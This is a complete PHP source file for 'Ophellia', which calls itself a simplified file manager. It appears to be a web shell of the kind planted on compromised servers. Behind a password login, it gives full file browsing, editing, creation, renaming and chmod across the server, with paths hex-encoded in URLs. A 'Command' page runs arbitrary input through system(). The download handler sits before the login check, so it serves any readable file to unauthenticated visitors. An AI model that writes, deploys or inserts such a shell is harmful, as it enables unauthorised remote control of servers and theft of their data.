<?php declare(strict_types=1);

const VERSION = '2.1.0-light';
const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';

// Buffer for storing alerts to display later
$alertMessages = [];

function hexToString(string $hex): string {
    return pack('H*', $hex);
}

function stringToHex(string $string): string {
    return unpack('H*', $string)[1];
}

function encryptPath(string $path): string {
    return stringToHex($path);
}

function decryptPath(string $path): string {
    return hexToString($path);
}

function authenticate(): bool {
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], PASSWORD_HASH)) {
            $_SESSION['authenticated'] = true;
            return true;
        }
    }
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function formatSize(int $size): string {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPerms(string $file): string {
    $perms = fileperms($file);
    $info = '';
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function getCurrentUser(): string {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $user = posix_getpwuid(posix_geteuid());
        return $user['name'];
    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $user = exec('whoami');
        return $user;
    } else {
        return getenv('USERNAME') ?: getenv('USER');
    }
}

function breadcrumbPath(string $path): string {
    $path = rtrim($path, DIRECTORY_SEPARATOR);
    $isWin = DIRECTORY_SEPARATOR === '\\';
    $parts = $isWin ? explode('\\', $path) : explode('/', $path);
    $result = '';
    
    $breadcrumb = '';
    
    if ($isWin) {
        if (!empty($parts[0])) {
            $breadcrumb = $parts[0] . '\\';
            $result .= '<a href="?cd=' . encryptPath($breadcrumb) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[0]) . '</a>\\';
        }
        $pathSoFar = $parts[0] . '\\';
        for ($i = 1; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '\\';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[$i]) . '</a>\\';
            }
        }
        $result = rtrim($result, '\\');
    } else {
        $result = '<a href="?cd=' . encryptPath('/') . '" class="text-blue-600 hover:underline">/</a>';
        $pathSoFar = '/';
        for ($i = 0; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '/';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[$i]) . '</a>/';
            }
        }
        $result = rtrim($result, '/');
    }
    
    return $result;
}

function fileManager(string $dir): void {
    $allItems = array_diff(scandir($dir), ['.', '..']);
    
    // Separate folders and files, then sort them separately
    $folders = [];
    $files = [];
    
    foreach ($allItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    // Sort each array alphabetically
    sort($folders);
    sort($files);
    
    // Combine with folders first, then files
    $sortedItems = array_merge($folders, $files);
    
    echo '<div class="w-full overflow-x-auto">';
    echo '<table class="w-full border-collapse table-fixed">';
    echo '<thead><tr class="bg-gray-200">';
    echo '<th class="border px-4 py-2 text-left w-1/3">Name</th>';
    echo '<th class="border px-4 py-2 text-left w-1/12">Size</th>';
    echo '<th class="border px-4 py-2 text-left w-1/6">Permissions</th>';
    echo '<th class="border px-4 py-2 text-left w-1/6">Last Modified</th>';
    echo '<th class="border px-4 py-2 text-left w-1/4">Actions</th>';
    echo '</tr></thead><tbody>';
    
    // Parent directory link
    echo '<tr class="hover:bg-gray-100">';
    echo '<td class="border px-4 py-2">';
    echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="text-blue-600 hover:underline block whitespace-nowrap">..</a>';
    echo '</div>';
    echo '</td>';
    echo '<td class="border px-4 py-2">-</td>';
    echo '<td class="border px-4 py-2">-</td>';
    echo '<td class="border px-4 py-2">-</td>';
    echo '<td class="border px-4 py-2">-</td>';
    echo '</tr>';
    
    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);
        
        echo '<tr class="hover:bg-gray-100">';
        echo '<td class="border px-4 py-2">';
        echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
        
        if ($isDir) {
            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline block whitespace-nowrap">' . htmlspecialchars($item) . '</a>';
        } else {
            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline block whitespace-nowrap">' . htmlspecialchars($item) . '</a>';
        }
        
        echo '</div>';
        echo '</td>';
        echo '<td class="border px-4 py-2">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
        echo '<td class="border px-4 py-2">' . getPerms($fullPath) . '</td>';
        echo '<td class="border px-4 py-2">' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</td>';
        echo '<td class="border px-4 py-2">';
        echo '<div class="flex flex-wrap gap-2">';
        
        if (!$isDir) {
            echo '<a href="?download=' . encryptPath($fullPath) . '" class="text-green-600 hover:underline">Download</a> ';
            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">Edit</a> ';
        }
        
        echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="text-yellow-600 hover:underline">Rename</a> ';
        echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="text-purple-600 hover:underline">Chmod</a>';
        echo '</div>';
        echo '</td></tr>';
    }
    
    echo '</tbody></table></div>';
    
    // Add subtle custom CSS for scrollbars that only appear when needed
    echo '<style>
    .overflow-x-auto::-webkit-scrollbar {
        height: 6px;
    }
    .overflow-x-auto::-webkit-scrollbar-track {
        background: #f1f1f1;
    }
    .overflow-x-auto::-webkit-scrollbar-thumb {
        background: #888;
        border-radius: 3px;
    }
    .overflow-x-auto::-webkit-scrollbar-thumb:hover {
        background: #555;
    }
    </style>';
}

function showAlert(string $message, string $type = 'success'): void {
    global $alertMessages;
    $alertMessages[] = ['message' => $message, 'type' => $type];
}

function viewFile(string $file): void {
    $content = htmlspecialchars(file_get_contents($file));
    
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Viewing: ' . htmlspecialchars(basename($file)) . '</h2>';
    
    // File info section
    echo '<div class="mb-4 p-2 bg-gray-100 rounded">';
    echo '<p><strong>Path:</strong> ' . htmlspecialchars($file) . '</p>';
    echo '<p><strong>Size:</strong> ' . formatSize(filesize($file)) . '</p>';
    echo '<p><strong>Permissions:</strong> ' . getPerms($file) . '</p>';
    echo '<p><strong>Last Modified:</strong> ' . date("Y-m-d H:i:s", filemtime($file)) . '</p>';
    echo '</div>';
    
    // File content
    echo '<div class="mb-4">';
    echo '<pre class="bg-gray-800 text-gray-100 p-4 rounded overflow-auto max-h-96">' . $content . '</pre>';
    echo '</div>';
    
    // Actions
    echo '<div class="flex space-x-2">';
    echo '<a href="?action=edit&file=' . encryptPath($file) . '" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Edit</a>';
    echo '<a href="?download=' . encryptPath($file) . '" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">Download</a>';
    echo '<a href="?cd=' . encryptPath(dirname($file)) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Back</a>';
    echo '</div>';
    
    echo '</div>';
}

function downloadFile(string $file): void {
    if (file_exists($file)) {
        $filename = basename($file);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush(); // Flush system output buffer
        readfile($file);
        exit;
    }
}

function editFile(string $file): void {
    $dirname = dirname($file);
    
    // Store original action and file parameters
    $action = isset($_GET['action']) ? $_GET['action'] : '';
    $fileParam = isset($_GET['file']) ? $_GET['file'] : '';
    
    // Process the form submission
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        // Instead of redirecting, just reset the POST data
        $_POST = array();
        // Display success alert and file manager
        showAlert("File saved successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    // Show edit form
    $content = htmlspecialchars(file_get_contents($file));
    
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Editing: ' . htmlspecialchars(basename($file)) . '</h2>';
    echo '<form method="post">';
    echo '<textarea name="content" rows="20" class="w-full p-2 border border-gray-300 rounded mb-4">' . $content . '</textarea>';
    echo '<div class="flex space-x-2">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Save</button>';
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
}

function newFile(string $dir): void {
    if (isset($_POST['filename']) && isset($_POST['content'])) {
        if (empty($_POST['filename'])) {
            showAlert("File name cannot be empty!", "error");
            displayNewFileForm($dir);
            return;
        }
        
        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
        file_put_contents($filename, $_POST['content']);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File created successfully!", "success");
        fileManager($dir);
        return;
    }
    
    displayNewFileForm($dir);
}

function displayNewFileForm(string $dir): void {
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Create New File in: ' . htmlspecialchars($dir) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">Filename:</label>';
    echo '<input type="text" name="filename" class="w-full p-2 border border-gray-300 rounded" required>';
    echo '</div>';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">Content:</label>';
    echo '<textarea name="content" rows="15" class="w-full p-2 border border-gray-300 rounded"></textarea>';
    echo '</div>';
    echo '<div class="flex space-x-2">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Create</button>';
    echo '<a href="?cd=' . encryptPath($dir) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
}

function newFolder(string $dir): void {
    if (isset($_POST['foldername'])) {
        if (empty($_POST['foldername'])) {
            showAlert("Folder name cannot be empty!", "error");
            displayNewFolderForm($dir);
            return;
        }
        
        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
        mkdir($foldername, 0755);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Folder created successfully!", "success");
        fileManager($dir);
        return;
    }
    
    displayNewFolderForm($dir);
}

function displayNewFolderForm(string $dir): void {
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Create New Folder in: ' . htmlspecialchars($dir) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">Folder Name:</label>';
    echo '<input type="text" name="foldername" class="w-full p-2 border border-gray-300 rounded" required>';
    echo '</div>';
    echo '<div class="flex space-x-2">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Create</button>';
    echo '<a href="?cd=' . encryptPath($dir) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
}

function commandLine(string $dir): void {
    $output = '';
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($dir);
        
        ob_start();
        system($command . " 2>&1", $return_var);
        $output = ob_get_clean();
    }
    
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Command Line in: ' . htmlspecialchars($dir) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">Command:</label>';
    echo '<input type="text" name="command" class="w-full p-2 border border-gray-300 rounded">';
    echo '</div>';
    echo '<div class="mb-4">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Execute</button>';
    echo '</div>';
    echo '</form>';
    
    if (!empty($output)) {
        echo '<div class="mt-4">';
        echo '<h3 class="text-lg font-bold mb-2">Output:</h3>';
        echo '<pre class="bg-black text-green-500 p-4 rounded overflow-auto max-h-96">' . htmlspecialchars($output) . '</pre>';
        echo '</div>';
    }
    echo '</div>';
}

function renameFile(string $file): void {
    $dirname = dirname($file);
    
    if (isset($_POST['newname'])) {
        if (empty($_POST['newname'])) {
            showAlert("New name cannot be empty!", "error");
            displayRenameForm($file);
            return;
        }
        
        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
        rename($file, $newname);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File renamed successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    displayRenameForm($file);
}

function displayRenameForm(string $file): void {
    $dirname = dirname($file);
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Rename: ' . htmlspecialchars(basename($file)) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">New Name:</label>';
    echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" class="w-full p-2 border border-gray-300 rounded" required>';
    echo '</div>';
    echo '<div class="flex space-x-2">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Rename</button>';
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
}

function chmodFile(string $file): void {
    $dirname = dirname($file);
    
    if (isset($_POST['permission'])) {
        if (!preg_match('/^[0-7]{3,4}$/', $_POST['permission'])) {
            showAlert("Invalid permission format!", "error");
            displayChmodForm($file);
            return;
        }
        
        $permission = octdec($_POST['permission']);
        chmod($file, $permission);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Permissions changed successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    displayChmodForm($file);
}

function displayChmodForm(string $file): void {
    $dirname = dirname($file);
    echo '<div class="container mx-auto p-4">';
    echo '<h2 class="text-xl font-bold mb-4">Change Permission: ' . htmlspecialchars(basename($file)) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700">Permission (octal):</label>';
    echo '<input type="text" name="permission" value="' . substr(sprintf('%o', fileperms($file)), -4) . '" class="w-full p-2 border border-gray-300 rounded" required pattern="[0-7]{3,4}">';
    echo '</div>';
    echo '<div class="flex space-x-2">';
    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Change</button>';
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
}

session_start();
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');

// Handle download first
if (isset($_GET['download'])) {
    $file = decryptPath($_GET['download']);
    downloadFile($file);
    exit;
}

if (!authenticate()) {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authentication</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-100 flex items-center justify-center min-h-screen">
        <div class="bg-white p-8 rounded shadow-md w-96">
            <h1 class="text-2xl font-bold mb-6 text-center">Ophellia ' . VERSION . '</h1>
            <form method="post" action="">
                <div class="mb-4">
                    <label for="password" class="block text-gray-700">Password</label>
                    <input type="password" id="password" name="password" class="w-full p-2 border border-gray-300 rounded">
                </div>
                <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
if (!file_exists($currentDir) || !is_dir($currentDir)) {
    $currentDir = getcwd();
}

$currentUser = getCurrentUser();
$currentTime = date('Y-m-d H:i:s');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ophellia <?= VERSION ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .alert-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            max-width: 400px;
            width: auto;
        }
        .alert {
            margin-bottom: 10px;
            padding: 15px;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: slideIn 0.3s ease-out;
        }
        .alert-success {
            background-color: #d1fae5;
            border-left: 4px solid #10b981;
            color: #065f46;
        }
        .alert-error {
            background-color: #fee2e2;
            border-left: 4px solid #ef4444;
            color: #991b1b;
        }
        .close-alert {
            cursor: pointer;
            font-weight: bold;
            font-size: 18px;
            margin-left: 15px;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        @keyframes fadeOut {
            from {
                opacity: 1;
            }
            to {
                opacity: 0;
            }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen">
    <!-- Alert Container -->
    <div id="alertContainer" class="alert-container"></div>
    
    <header class="bg-gray-800 text-white p-4">
        <div class="container mx-auto">
            <h1 class="text-xl font-bold">Ophellia <?= VERSION ?></h1>
            <p class="text-sm">Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted): <?= $currentTime ?></p>
            <p class="text-sm">Current User's Login: <?= htmlspecialchars($currentUser) ?></p>
        </div>
    </header>
    
    <div class="container mx-auto p-4">
        <div class="bg-white p-4 rounded shadow mb-4">
            <p class="mb-2"><strong>Current Directory:</strong> 
                <span class="path-navigator">
                    <?= breadcrumbPath($currentDir) ?>
                </span>
            </p>
            
            <div class="flex flex-wrap gap-2 mb-4">
                <a href="?action=newfile&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600">New File</a>
                <a href="?action=newfolder&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600">New Folder</a>
                <a href="?action=command&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-purple-500 text-white rounded hover:bg-purple-600">Command</a>
            </div>
        </div>
        
        <?php
        if (isset($_GET['action'])) {
            switch ($_GET['action']) {
                case 'view':
                    if (isset($_GET['file'])) {
                        viewFile(decryptPath($_GET['file']));
                    }
                    break;
                case 'edit':
                    if (isset($_GET['file'])) {
                        editFile(decryptPath($_GET['file']));
                    }
                    break;
                case 'newfile':
                    if (isset($_GET['path'])) {
                        newFile(decryptPath($_GET['path']));
                    }
                    break;
                case 'newfolder':
                    if (isset($_GET['path'])) {
                        newFolder(decryptPath($_GET['path']));
                    }
                    break;
                case 'command':
                    if (isset($_GET['path'])) {
                        commandLine(decryptPath($_GET['path']));
                    }
                    break;
                case 'rename':
                    if (isset($_GET['file'])) {
                        renameFile(decryptPath($_GET['file']));
                    }
                    break;
                case 'chmod':
                    if (isset($_GET['file'])) {
                        chmodFile(decryptPath($_GET['file']));
                    }
                    break;
                default:
                    fileManager($currentDir);
            }
        } else {
            fileManager($currentDir);
        }
        ?>
    </div>
    
    <footer class="bg-gray-800 text-white p-4 mt-8">
        <div class="container mx-auto text-center">
            <p>Ophellia <?= VERSION ?> - Simplified File Manager</p>
        </div>
    </footer>

    <script>
        // Alert management
        let alertCounter = 0;
        
        function showAlert(message, type) {
            const alertContainer = document.getElementById('alertContainer');
            const alertId = `alert-${alertCounter++}`;
            
            const alertClass = type === 'success' ? 'alert-success' : 'alert-error';
            
            const alertElement = document.createElement('div');
            alertElement.className = `alert ${alertClass}`;
            alertElement.id = alertId;
            
            alertElement.innerHTML = `
                <div>${message}</div>
                <span class="close-alert" onclick="closeAlert('${alertId}')">&times;</span>
            `;
            
            alertContainer.appendChild(alertElement);
            
            // Auto-close after 5 seconds
            setTimeout(() => {
                closeAlert(alertId);
            }, 5000);
        }
        
        function closeAlert(alertId) {
            const alertElement = document.getElementById(alertId);
            if (alertElement) {
                alertElement.style.animation = 'fadeOut 0.3s ease-out';
                setTimeout(() => {
                    alertElement.remove();
                }, 300);
            }
        }
        
        // Display all stored alerts once the page is loaded
        document.addEventListener('DOMContentLoaded', function() {
            <?php
            // Output the JavaScript code to show all buffered alerts
            foreach ($alertMessages as $alert) {
                echo "showAlert('" . addslashes($alert['message']) . "', '" . $alert['type'] . "');\n";
            }
            ?>
        });
    </script>
</body>
</html>